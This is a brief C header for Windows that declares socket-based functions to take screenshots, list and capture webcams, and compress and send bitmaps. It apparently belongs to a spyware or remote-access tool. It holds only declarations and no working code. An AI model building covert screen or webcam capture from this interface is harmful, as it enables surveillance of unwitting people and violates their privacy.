



#ifndef _USER_SPY_H_
#define _USER_SPY_H_
#include<winsock2.h>
#include <gdiplus.h>
#include<windows.h>
typedef struct spy_error
{
    DWORD code;
    DWORD reason;
}SPY_ERROR , * PSPY_ERROR;


extern void ScreenShot(SOCKET sock);
extern BOOL Compress_and_Send(HBITMAP bitmap,SOCKET sock,PDWORD reason);
extern void List_Webcam(SOCKET sock);
extern void Webcam_Capture(SOCKET sock);
#endif // _USER_SPY_H_
